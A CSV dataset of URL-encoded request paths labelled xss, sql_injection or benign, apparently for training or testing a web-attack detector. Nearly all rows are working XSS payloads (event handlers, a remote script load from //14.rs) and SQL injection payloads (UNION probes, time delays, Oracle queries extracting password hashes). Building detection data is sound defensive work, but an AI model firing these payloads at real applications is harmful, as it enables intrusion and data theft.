text,label
/v1/search?q=%3Cstyle%3E%3Atarget+%7Btransform%3A+rotate%28180deg%29%3B%7D%3C%2Fstyle%3E%3Cdt+id%3Dx+style%3D%22transition%3Atransform+2s%22+ontransitionrun%3Dalert%281%29%3E%3C%2Fdt%3E,xss
/v1/search?q=%3Cmap+onmousemove%3D%22alert%281%29%22%3Etest%3C%2Fmap%3E,xss
/api/v2/comments/%3Ccanvas+oncopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fcanvas%3E,xss
/api/v1/feedback?message=%3Cmenu+onblur%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fmenu%3E%3Cinput+autofocus%3E,xss
/v1/profile?bio=%3Cfieldset+onkeyup%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Ffieldset%3E,xss
/v1/orders?customer_id=%22&status=active,sql_injection
/api/v1/feedback?message=%3Cdt+ondblclick%3D%22alert%281%29%22%3Etest%3C%2Fdt%3E,xss
/api/v2/comments/%3Ctr+id%3Dx+tabindex%3D1+onbeforeactivate%3Dalert%281%29%3E%3C%2Ftr%3E,xss
/api/v1/feedback?message=%3Cblockquote+onbeforecut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fblockquote%3E,xss
/v1/profile?bio=%3Cmap+onfocusout%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fmap%3E%3Cinput+autofocus%3E,xss
/v1/profile?bio=%3Ccenter+ondblclick%3D%22alert%281%29%22%3Etest%3C%2Fcenter%3E,xss
/api/v1/users?id=UNION+ALL+SELECT+%27INJ%27%7C%7C%27ECT%27%7C%7C%27XXX%27%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22--,sql_injection
/api/v1/reviews?body=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Clisting+style%3D%22animation-name%3Ax%22+onanimationend%3D%22alert%281%29%22%3E%3C%2Flisting%3E,xss
/api/v2/profile?id=%3Cbr+onmouseout%3D%22alert%281%29%22%3Etest%3C%2Fbr%3E,xss
/v1/search?q=%3Cmain+onkeydown%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fmain%3E,xss
/api/v1/reviews?body=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Cstyle+ondragover%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fstyle%3E,xss
/api/v2/comments/%3Cstyle%3E%3Atarget+%7Bcolor%3Ared%3B%7D%3C%2Fstyle%3E%3Cmarquee+id%3Dx+style%3D%22transition%3Acolor+1s%22+ontransitionend%3Dalert%281%29%3E%3C%2Fmarquee%3E,xss
/api/v1/feedback?message=%3Capplet+onblur%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fapplet%3E%3Cinput+autofocus%3E,xss
/api/v1/users?id=ORDER+BY+7%23,sql_injection
/v1/search?q=%3Cruby+onmouseout%3D%22alert%281%29%22%3Etest%3C%2Fruby%3E,xss
/api/v1/reviews?body=%3Cstyle%3E%3Atarget+%7Bcolor%3A+red%3B%7D%3C%2Fstyle%3E%3Cem+id%3Dx+style%3D%22transition%3Acolor+10s%22+ontransitioncancel%3Dalert%281%29%3E%3C%2Fem%3E,xss
/v1/profile?bio=%3Csvg%3E%3Cstrong+onload%3Dalert%281%29%3E%3C%2Fstrong%3E,xss
/api/v1/reviews?body=%3Cpre+draggable%3D%22true%22+ondragleave%3D%22alert%281%29%22%3Etest%3C%2Fpre%3E,xss
/api/v1/reviews?body=%3Cbase+id%3Dx+tabindex%3D1+onfocus%3Dalert%281%29%3E%3C%2Fbase%3E,xss
/api/v1/feedback?message=%3Cfigure+onpaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Ffigure%3E,xss
/api/v2/comments/%3Chtml+onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Fhtml%3E,xss
/api/v1/comments?text=%3Cstyle%3E%3Atarget+%7Bcolor%3Ared%3B%7D%3C%2Fstyle%3E%3Ctextarea+id%3Dx+style%3D%22transition%3Acolor+1s%22+ontransitionend%3Dalert%281%29%3E%3C%2Ftextarea%3E,xss
/api/v2/search?q=%22%29%29%2520waitfor%2520delay%2520%270%3A0%3A20%27%2520--&key=API_KEY,sql_injection
/api/v1/reviews?body=%3Cmeta+onbeforecopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fmeta%3E,xss
/v1/profile?bio=%3Caudio+oncopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Faudio%3E,xss
/api/v1/feedback?message=%3Cstyle%3E%3Atarget+%7Bcolor%3A+red%3B%7D%3C%2Fstyle%3E%3Cisindex+id%3Dx+style%3D%22transition%3Acolor+10s%22+ontransitioncancel%3Dalert%281%29%3E%3C%2Fisindex%3E,xss
/api/v2/search?q=UNION+ALL+SELECT+%27INJ%27%7C%7C%27ECT%27%7C%7C%27XXX%27%2C2%2C3%2C4%2C5%2C6%2C7%2C8--&key=API_KEY,sql_injection
/api/v2/profile?id=%3Csection+onkeyup%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fsection%3E,xss
/v1/search?q=%3Cdd+oncontextmenu%3D%22alert%281%29%22%3Etest%3C%2Fdd%3E,xss
/api/v1/feedback?message=%3Crtc+onbeforepaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Frtc%3E,xss
/api/v1/login?username=%22%29%2C%28select%2520if%28count%28%2A%29%21%3D-1%2Cbenchmark%283000000%2CMD5%281%29%29%2Cbenchmark%283000000%2CMD5%281%29%29%29%29%2523&password=pass,sql_injection
/api/v1/search?q=and+%28select+substring%28%40%40version%2C1%2C1%29%29%3D%27M%27,sql_injection
/api/v1/comments?text=%3Cmeta+onbeforepaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fmeta%3E,xss
/api/v2/profile?id=%3Caddress+onbeforecopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Faddress%3E,xss
/v1/profile?bio=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Csection+ondragover%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fsection%3E,xss
/v1/profile?bio=%3Caddress+ondblclick%3D%22alert%281%29%22%3Etest%3C%2Faddress%3E,xss
/api/v2/comments/%3Cdfn+id%3Dx+tabindex%3D1+onbeforedeactivate%3Dalert%281%29%3E%3C%2Fdfn%3E%3Cinput+autofocus%3E,xss
/api/v1/reviews?body=%3Cdir+onmouseenter%3D%22alert%281%29%22%3Etest%3C%2Fdir%3E,xss
/v1/profile?bio=%3Cu+onblur%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fu%3E%3Cinput+autofocus%3E,xss
/api/v2/profile?id=%3Ccenter+draggable%3D%22true%22+ondrag%3D%22alert%281%29%22%3Etest%3C%2Fcenter%3E,xss
/api/v2/comments/%3Cbase+onpaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fbase%3E,xss
/api/v2/profile?id=%22onclick%3Dprompt%288%29%3E%22%40x.y,xss
/api/v1/comments?text=%3Cstyle%3E%3Atarget+%7Bcolor%3Ared%3B%7D%3C%2Fstyle%3E%3Cscript+id%3Dx+style%3D%22transition%3Acolor+1s%22+ontransitionend%3Dalert%281%29%3E%3C%2Fscript%3E,xss
/api/v1/comments?text=%3Csvg%3E%3Ccenter+onload%3Dalert%281%29%3E%3C%2Fcenter%3E,xss
/api/v2/comments/%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Ccolgroup+ondragover%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fcolgroup%3E,xss
/api/v1/comments?text=%3Cmeter+onpaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fmeter%3E,xss
/v1/profile?bio=%3Cdel+onmouseover%3D%22alert%281%29%22%3Etest%3C%2Fdel%3E,xss
/api/v1/feedback?message=%3Ctitle+onbeforepaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Ftitle%3E,xss
/v1/profile?bio=%3Cdel+onmouseup%3D%22alert%281%29%22%3Etest%3C%2Fdel%3E,xss
/api/v2/profile?id=%3Csub+onblur%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fsub%3E%3Cinput+autofocus%3E,xss
/api/v2/profile?id=%3Clegend+onbeforecopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Flegend%3E,xss
/api/v2/profile?id=%3Cvideo+controls+autoplay+onended%3Dalert%281%29%3E%3Csource+src%3D%22validvideo.mp4%22+type%3D%22video%2Fmp4%22%3E%3C%2Fvideo%3E,xss
/api/v1/reviews?body=%3Ctrack+onbeforecopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Ftrack%3E,xss
/v1/products/%27+and+1%3D%271,sql_injection
/api/v2/profile?id=%3Cnav+draggable%3D%22true%22+ondragleave%3D%22alert%281%29%22%3Etest%3C%2Fnav%3E,xss
/api/v1/comments?text=%3Cwbr+onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Fwbr%3E,xss
/api/v1/reviews?body=%3Clink+onkeydown%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Flink%3E,xss
/v1/search?q=%3Cisindex+onmouseenter%3D%22alert%281%29%22%3Etest%3C%2Fisindex%3E,xss
/v1/search?q=%3Ctrack+id%3Dx+tabindex%3D1+onbeforedeactivate%3Dalert%281%29%3E%3C%2Ftrack%3E%3Cinput+autofocus%3E,xss
/api/v1/comments?text=%3Cmarquee+draggable%3D%22true%22+ondragend%3D%22alert%281%29%22%3Etest%3C%2Fmarquee%3E,xss
/api/v1/reviews?body=%3Cstyle%3E%3Atarget+%7Bcolor%3Ared%3B%7D%3C%2Fstyle%3E%3Cnextid+id%3Dx+style%3D%22transition%3Acolor+1s%22+ontransitionend%3Dalert%281%29%3E%3C%2Fnextid%3E,xss
/v1/profile?bio=%3Cdatalist+draggable%3D%22true%22+ondragend%3D%22alert%281%29%22%3Etest%3C%2Fdatalist%3E,xss
/api/v2/items/ORDER+BY+28?key=API_KEY,sql_injection
/api/v1/feedback?message=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Ctrack+ondrop%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Ftrack%3E,xss
/v1/profile?bio=%3Csvg%3E%3Cheader+onload%3Dalert%281%29%3E%3C%2Fheader%3E,xss
/v1/profile?bio=%3Cnextid+oncopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fnextid%3E,xss
/api/v1/profile?id=195295,benign
/api/v1/feedback?message=%3Ctt+onmouseover%3D%22alert%281%29%22%3Etest%3C%2Ftt%3E,xss
/v1/search?q=%3Cstyle%3E%3Atarget+%7Btransform%3A+rotate%28180deg%29%3B%7D%3C%2Fstyle%3E%3Cfont+id%3Dx+style%3D%22transition%3Atransform+2s%22+ontransitionrun%3Dalert%281%29%3E%3C%2Ffont%3E,xss
/api/v1/feedback?message=%3Ctextarea+id%3Dx+tabindex%3D1+ondeactivate%3Dalert%281%29%3E%3C%2Ftextarea%3E%3Cinput+id%3Dy+autofocus%3E,xss
/v1/profile?bio=%3Cabbr+onbeforecut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fabbr%3E,xss
/api/v2/items/%27%29%29%3Bwaitfor+delay+%270%3A0%3A__TIME__%27--?key=API_KEY,sql_injection
/api/v2/comments/%3Cfooter+onmousemove%3D%22alert%281%29%22%3Etest%3C%2Ffooter%3E,xss
/api/v2/items/UNION+ALL+SELECT+1%2C2%2C3%2C4%2C5--?key=API_KEY,sql_injection
/api/v1/comments?text=%3Cstyle%3E%40keyframes+x%7Bfrom+%7Bleft%3A0%3B%7Dto+%7Bleft%3A+1000px%3B%7D%7D%3Atarget+%7Banimation%3A10s+ease-in-out+0s+1+x%3B%7D%3C%2Fstyle%3E%3Ctbody+id%3Dx+style%3D%22position%3Aabsolute%3B%22+onanimationcancel%3D%22alert%281%29%22%3E%3C%2Ftbody%3E,xss
/api/v2/users/new%2Bwatch,benign
/api/v2/items/UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5?key=API_KEY,sql_injection
/api/v1/feedback?message=exp%2F%2A%3CXSS+STYLE%3D%27no%5Cxss%3Anoxss%28%22%2A%2F%2F%2A%22%29%3B,xss
/api/v1/reviews?body=%3Cu+id%3Dx+tabindex%3D1+onactivate%3Dalert%281%29%3E%3C%2Fu%3E,xss
/v1/profile?bio=%3Cnoscript+oncut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fnoscript%3E,xss
/api/v1/users?id=%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%29%2520waitfor%2520delay%2520%270%3A0%3A20%27%2520%2F%2A,sql_injection
/api/v1/reviews?body=%3Cxmp+onmouseenter%3D%22alert%281%29%22%3Etest%3C%2Fxmp%3E,xss
/api/v2/profile?id=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Csummary+ondrop%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fsummary%3E,xss
/api/v2/comments/%3Cnoembed+onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Fnoembed%3E,xss
/api/v1/feedback?message=%3Cstyle%3E%3Atarget+%7Btransform%3A+rotate%28180deg%29%3B%7D%3C%2Fstyle%3E%3Ctable+id%3Dx+style%3D%22transition%3Atransform+2s%22+ontransitionrun%3Dalert%281%29%3E%3C%2Ftable%3E,xss
/api/v1/reviews?body=top%5B%22al%22%2B%22ert%22%5D%281%29,xss
/api/v1/comments?text=%3Cfigcaption+onmousemove%3D%22alert%281%29%22%3Etest%3C%2Ffigcaption%3E,xss
/v1/search?q=%3Cspan+onclick%3D%22alert%281%29%22%3Etest%3C%2Fspan%3E,xss
/api/v2/items/UNION+ALL+SELECT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%2C28%2C29?key=API_KEY,sql_injection
/api/v1/comments?text=%3Ccontent+onblur%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fcontent%3E%3Cinput+autofocus%3E,xss
/api/v1/comments?text=%3Cstyle+onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Fstyle%3E,xss
/v1/search?q=%3Ckeygen+onmouseout%3D%22alert%281%29%22%3Etest%3C%2Fkeygen%3E,xss
/api/v2/comments/%3C%21--%3E%3CscRipT+src%3D%2F%2F14.rs%3E,xss
/api/v1/reviews?body=%3Cimg+id%3Dx+tabindex%3D1+onbeforedeactivate%3Dalert%281%29%3E%3C%2Fimg%3E%3Cinput+autofocus%3E,xss
/api/v2/items/%27+AND+1%3Dutl_inaddr.get_host_address%28%28SELECT+DISTINCT%28PASSWORD%29+FROM+%28SELECT+DISTINCT%28PASSWORD%29%2C+ROWNUM+AS+LIMIT+FROM+SYS.USER%24%29+WHERE+LIMIT%3D7%29%29+AND+%27i%27%3D%27i?key=API_KEY,sql_injection
/api/v2/profile?id=%3Cdiv+id%3D%22126%22%3E%3Cobject+id%3D%22x%22+classid%3D%22clsid%3ACB927D12-4FF7-4a9e-A169-56E4B8A75598%22%3E%3C%2Fobject%3E,xss
/api/v2/comments/%3Clegend+id%3Dx+tabindex%3D1+ondeactivate%3Dalert%281%29%3E%3C%2Flegend%3E%3Cinput+id%3Dy+autofocus%3E,xss
/api/v1/reviews?body=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Crtc+style%3D%22animation-name%3Ax%22+onanimationstart%3D%22alert%281%29%22%3E%3C%2Frtc%3E,xss
/api/v1/users?id=%22%29%29%29%29+waitfor+delay+%270%3A0%3A20%27+%2F%2A,sql_injection
/api/v1/users?id=%27+select+%2A+from+information_schema.tables--,sql_injection
/v1/products/1+uni%2F%2A%2A%2Fon+select+all+from+where,sql_injection
/api/v2/profile?id=%3Ch1+draggable%3D%22true%22+ondragleave%3D%22alert%281%29%22%3Etest%3C%2Fh1%3E,xss
/api/v2/items/OR+x%3Dy?key=API_KEY,sql_injection
/v1/search?q=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Coption+style%3D%22animation-name%3Ax%22+onanimationstart%3D%22alert%281%29%22%3E%3C%2Foption%3E,xss
/v1/profile?bio=%3Cdialog+onpaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fdialog%3E,xss
/api/v1/search?q=%29%29+or+pg_sleep%28__TIME__%29--,sql_injection
/api/v1/feedback?message=%3Cscript+id%3Dx+tabindex%3D1+onfocus%3Dalert%281%29%3E%3C%2Fscript%3E,xss
/api/v2/comments/%3Ccite+onmouseout%3D%22alert%281%29%22%3Etest%3C%2Fcite%3E,xss
/api/v1/comments?text=%3Csummary+id%3Dx+tabindex%3D1+onfocus%3Dalert%281%29%3E%3C%2Fsummary%3E,xss
/api/v1/reviews?body=%3Ca+id%3D%22x%22%3E%3Crect+fill%3D%22white%22+width%3D%221000%22+height%3D%221000%22%2F%3E%3C%2Fa%3E,xss
/api/v1/search?q=%27+or+%27whatever%27+in+%28%27whatever%27%29,sql_injection
/api/v2/profile?id=%3Cstyle%3E%3Atarget+%7Bcolor%3A+red%3B%7D%3C%2Fstyle%3E%3Cmain+id%3Dx+style%3D%22transition%3Acolor+10s%22+ontransitioncancel%3Dalert%281%29%3E%3C%2Fmain%3E,xss
/api/v1/feedback?message=%3Cfigcaption+draggable%3D%22true%22+ondragleave%3D%22alert%281%29%22%3Etest%3C%2Ffigcaption%3E,xss
/api/v1/feedback?message=%3Ctime+id%3Dx+tabindex%3D1+onfocusin%3Dalert%281%29%3E%3C%2Ftime%3E,xss
/api/v1/comments?text=%3Cbasefont+id%3Dx+tabindex%3D1+onactivate%3Dalert%281%29%3E%3C%2Fbasefont%3E,xss
/v1/profile?bio=%3Ctextarea+id%3Dx+tabindex%3D1+onbeforeactivate%3Dalert%281%29%3E%3C%2Ftextarea%3E,xss
/api/v1/orders/123,benign
/api/v1/feedback?message=%3Csummary+onblur%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fsummary%3E%3Cinput+autofocus%3E,xss
/v1/search?q=%3Cparam+id%3Dx+tabindex%3D1+onbeforedeactivate%3Dalert%281%29%3E%3C%2Fparam%3E%3Cinput+autofocus%3E,xss
/api/v1/feedback?message=%3Cframe+onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Fframe%3E,xss
/api/v2/items/%22%29%29%3Bwaitfor+delay+%270%3A0%3A__TIME__%27--?key=API_KEY,sql_injection
/api/v1/comments?text=%3Ctr+onmouseenter%3D%22alert%281%29%22%3Etest%3C%2Ftr%3E,xss
/api/v1/users?id=AND+2947%3DLIKE%28%27ABCDEFG%27%2CUPPER%28HEX%28RANDOMBLOB%28500000000%2F2%29%29%29%29,sql_injection
/api/v1/login?username=%27+AND+1%3Dutl_inaddr.get_host_address%28%28SELECT+DISTINCT%28table_name%29+FROM+%28SELECT+DISTINCT%28table_name%29%2C+ROWNUM+AS+LIMIT+FROM+sys.all_tables%29+WHERE+LIMIT%3D4%29%29+AND+%27i%27%3D%27i&password=pass,sql_injection
/api/v1/feedback?message=%3Cstyle%3E%3Atarget+%7Bcolor%3A+red%3B%7D%3C%2Fstyle%3E%3Cparam+id%3Dx+style%3D%22transition%3Acolor+10s%22+ontransitioncancel%3Dalert%281%29%3E%3C%2Fparam%3E,xss
/v1/products/UNION+ALL+SELECT+%40%40VERSION%2CUSER%28%29%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--,sql_injection
/api/v1/search?q=x%27+AND+userid+IS+NULL%3B+--,sql_injection
/v1/search?q=%3Csup+id%3Dx+tabindex%3D1+onfocusin%3Dalert%281%29%3E%3C%2Fsup%3E,xss
/api/v2/comments/%3Cscript%3Ex%3Ddocument.createElement%28%2522iframe%2522%29%3Bx.src%3D%2522http%3A%2F%2Fxssme.html5sec.org%2F404%2522%3Bx.onload%3Dfunction%28%29%7Bwindow.frames%5B0%5D.document.write%28%2522%3Cscript%3Er%3Dnew+XMLHttpRequest%28%29%3Br.open%28%27GET%27%2C%27http%3A%2F%2Fxssme.html5sec.org%2Fxssme2%27%2Cfalse%29%3Br.send%28null%29%3Bif%28r.status%3D%3D200%29%7Balert%28r.responseText.substr%28150%2C41%29%29%3B%7D%3C%5C%2Fscript%3E%2522%29%7D%3Bdocument.body.appendChild%28x%29%3B%3C%2Fscript%3E,xss
/v1/profile?bio=%3Chgroup+draggable%3D%22true%22+ondragend%3D%22alert%281%29%22%3Etest%3C%2Fhgroup%3E,xss
/api/v1/comments?text=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Cmark+ondragover%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fmark%3E,xss
/api/v1/reviews?body=%3Ctitle+onmouseenter%3D%22alert%281%29%22%3Etest%3C%2Ftitle%3E,xss
/api/v2/comments/%3Col+onkeydown%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fol%3E,xss
/api/v1/reviews?body=%3Cdiv+id%3D%2291%22%3E%5BA%5D,xss
/v1/products/WHERE+1%3D1+AND+1%3D1,sql_injection
/api/v2/comments/%3Cul+onmouseenter%3D%22alert%281%29%22%3Etest%3C%2Ful%3E,xss
/v1/profile?bio=%3Cwbr+ondblclick%3D%22alert%281%29%22%3Etest%3C%2Fwbr%3E,xss
/api/v1/feedback?message=%3Ci+oncopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fi%3E,xss
/api/v1/reviews?body=%3Cstyle%3E%3Atarget+%7Bcolor%3Ared%3B%7D%3C%2Fstyle%3E%3Cins+id%3Dx+style%3D%22transition%3Acolor+1s%22+ontransitionend%3Dalert%281%29%3E%3C%2Fins%3E,xss
/api/v1/comments?text=%3Caudio+onmouseover%3D%22alert%281%29%22%3Etest%3C%2Faudio%3E,xss
/api/v1/profile?id=81462,benign
/v1/search?q=%3Cstyle%3E%3Atarget+%7Bcolor%3A+red%3B%7D%3C%2Fstyle%3E%3Ca+id%3Dx+style%3D%22transition%3Acolor+10s%22+ontransitioncancel%3Dalert%281%29%3E%3C%2Fa%3E,xss
/api/v2/profile?id=%3Cstyle+id%3Dx+tabindex%3D1+onfocus%3Dalert%281%29%3E%3C%2Fstyle%3E,xss
/api/v1/comments?text=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Cdt+style%3D%22animation-name%3Ax%22+onanimationend%3D%22alert%281%29%22%3E%3C%2Fdt%3E,xss
/api/v1/feedback?message=%3Cq+oncut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fq%3E,xss
/api/v1/profile?id=155642,benign
/api/v1/login?username=UNION+ALL+SELECT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27&password=pass,sql_injection
/v1/profile?bio=navigator.vibrate%28500%29,xss
/api/v1/reviews?body=%3Ctbody+draggable%3D%22true%22+ondragend%3D%22alert%281%29%22%3Etest%3C%2Ftbody%3E,xss
/v1/search?q=%3Ccanvas+oncut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fcanvas%3E,xss
/api/v2/comments/%3Csvg%3E%3Cstrike+onload%3Dalert%281%29%3E%3C%2Fstrike%3E,xss
/v1/profile?bio=%3Cinput+name%3D%22username%22+value%3D%22admin%22+%2F%3E,xss
/api/v1/users?id=%2C%28select%2520if%28count%28%2A%29%21%3D-1%2Cbenchmark%283000000%2CMD5%281%29%29%2Cbenchmark%283000000%2CMD5%281%29%29%29%29--,sql_injection
/api/v2/comments/%3Cstyle%3E%40keyframes+x%7Bfrom+%7Bleft%3A0%3B%7Dto+%7Bleft%3A+1000px%3B%7D%7D%3Atarget+%7Banimation%3A10s+ease-in-out+0s+1+x%3B%7D%3C%2Fstyle%3E%3Cimage+id%3Dx+style%3D%22position%3Aabsolute%3B%22+onanimationcancel%3D%22alert%281%29%22%3E%3C%2Fimage%3E,xss
/v1/search?q=%3Ctbody+ondblclick%3D%22alert%281%29%22%3Etest%3C%2Ftbody%3E,xss
/v1/orders?customer_id=%27%29%29+waitfor+delay+%270%3A0%3A20%27+--&status=active,sql_injection
/api/v2/comments/%3Capplet+oncut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fapplet%3E,xss
/api/v2/profile?id=%3Cscript+onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Fscript%3E,xss
/api/v2/comments/%3Cpicture+id%3Dx+tabindex%3D1+onbeforedeactivate%3Dalert%281%29%3E%3C%2Fpicture%3E%3Cinput+autofocus%3E,xss
/api/v2/comments/%3Cblockquote+ondblclick%3D%22alert%281%29%22%3Etest%3C%2Fblockquote%3E,xss
/v1/search?q=%3Ciframe+onreadystatechange%3Dalert%281%29%3E%3C%2Fiframe%3E,xss
/v1/profile?bio=%3Cobject+onpaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fobject%3E,xss
/api/v1/feedback?message=%3Cmap+oncut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fmap%3E,xss
/api/v1/reviews?body=%3Cplaintext+draggable%3D%22true%22+ondragstart%3D%22alert%281%29%22%3Etest%3C%2Fplaintext%3E,xss
/api/v1/feedback?message=%3Cstyle%3E%3Atarget+%7Btransform%3A+rotate%28180deg%29%3B%7D%3C%2Fstyle%3E%3Cacronym+id%3Dx+style%3D%22transition%3Atransform+2s%22+ontransitionrun%3Dalert%281%29%3E%3C%2Facronym%3E,xss
/api/v1/reviews?body=%3Cmarquee+onstart%3Dalert%281%29%3EXSS%3C%2Fmarquee%3E,xss
/v1/search?q=%3Cbase+draggable%3D%22true%22+ondragleave%3D%22alert%281%29%22%3Etest%3C%2Fbase%3E,xss
/api/v1/feedback?message=%3Cstyle%3E%3Atarget+%7Bcolor%3A+red%3B%7D%3C%2Fstyle%3E%3Carticle+id%3Dx+style%3D%22transition%3Acolor+10s%22+ontransitioncancel%3Dalert%281%29%3E%3C%2Farticle%3E,xss
/v1/profile?bio=%3Cfieldset+draggable%3D%22true%22+ondragleave%3D%22alert%281%29%22%3Etest%3C%2Ffieldset%3E,xss
/api/v2/items/UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2C4%23?key=API_KEY,sql_injection
/v1/profile?bio=%3Cstyle%3E%3Atarget+%7Bcolor%3Ared%3B%7D%3C%2Fstyle%3E%3Ch1+id%3Dx+style%3D%22transition%3Acolor+1s%22+ontransitionend%3Dalert%281%29%3E%3C%2Fh1%3E,xss
/api/v1/feedback?message=%3Cacronym+id%3Dx+tabindex%3D1+onfocusin%3Dalert%281%29%3E%3C%2Facronym%3E,xss
/api/v1/orders/8164,benign
/api/v2/profile?id=%3Csmall+onmouseover%3D%22alert%281%29%22%3Etest%3C%2Fsmall%3E,xss
/v1/profile?bio=%3Csummary+onbeforepaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fsummary%3E,xss
/api/v2/comments/%3Ckbd+id%3Dx+tabindex%3D1+onfocusin%3Dalert%281%29%3E%3C%2Fkbd%3E,xss
/api/v1/feedback?message=%3Cruby+oncut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fruby%3E,xss
/v1/profile?bio=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,xss
